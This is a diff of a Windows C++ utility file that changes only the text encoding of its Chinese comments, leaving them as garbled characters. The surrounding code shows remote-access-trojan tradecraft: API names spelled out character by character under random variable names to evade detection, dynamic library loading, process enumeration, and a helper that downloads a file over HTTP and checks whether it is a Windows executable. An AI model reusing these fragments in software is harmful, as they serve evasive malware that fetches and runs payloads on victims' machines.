@@ -1,8 +1,8 @@
-ï»¿#include "stdafx.h"
+#include "stdafx.h"
 #if !defined(AFX_UNTIL_CPP_INCLUDED)
 #define AFX_UNTIL_CPP_INCLUDED
 
-#include "../Declare.h"   //åŠ¨æ€è°ƒç”¨åº“å‡½æ•°
+#include "../Declare.h"   //¶¯Ì¬µ÷ÓÃ¿âº¯Êı
 //#include <afxwin.h>
 #include <process.h>
 #include <Tlhelp32.h>
@@ -12,7 +12,7 @@
 #pragma comment( lib, "wininet.lib" )
 #pragma comment(lib, "Wtsapi32.lib")
 #include "until.h"
-#include "../Myfunction.h"  //è‡ªå®šä¹‰å‡½æ•°
+#include "../Myfunction.h"  //×Ô¶¨Òåº¯Êı
 
 extern Myfunction *pMyfunction;
 
@@ -38,7 +38,7 @@ DWORD WINAPI ThreadLoader(LPVOID lparam)
 	    char zyujYfj[] = {'S','e','t','E','v','e','n','t','\0'};
 	    SetEventT pSetEvent=(SetEventT)GetProcAddress(LoadLibrary(vaRYmkH),zyujYfj);
 		pSetEvent(arg.hEventTransferArg);
-		// ä¸æ¡Œé¢äº¤äº’
+		// Óë×ÀÃæ½»»¥
 		if (arg.bInteractive)
 		{
 			SelectDesktop(NULL);
@@ -78,7 +78,7 @@ DWORD GetProcessID(LPCSTR lpProcessName)
 	HANDLE			hProcessSnap = NULL;
 	PROCESSENTRY32	pe32 = {0};
 	
-	// è·å–ç³»ç»Ÿè¿›ç¨‹å¿«ç…§
+	// »ñÈ¡ÏµÍ³½ø³Ì¿ìÕÕ
 	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hProcessSnap == INVALID_HANDLE_VALUE)
 		return 0;
@@ -210,7 +210,7 @@ BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName)
             InternetReadFileT pInternetReadFile=(InternetReadFileT)GetProcAddress(LoadLibrary("WININET.dll"),"InternetReadFile");
 			pInternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead);
 			
-			// ç”±åˆ¤æ–­ç¬¬ä¸€ä¸ªæ•°æ®åŒ…æ˜¯ä¸æ˜¯æœ‰æ•ˆçš„PEæ–‡ä»¶
+			// ÓÉÅĞ¶ÏµÚÒ»¸öÊı¾İ°üÊÇ²»ÊÇÓĞĞ§µÄPEÎÄ¼ş
 // 			if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
 // 			{
 // 				bRet = false;
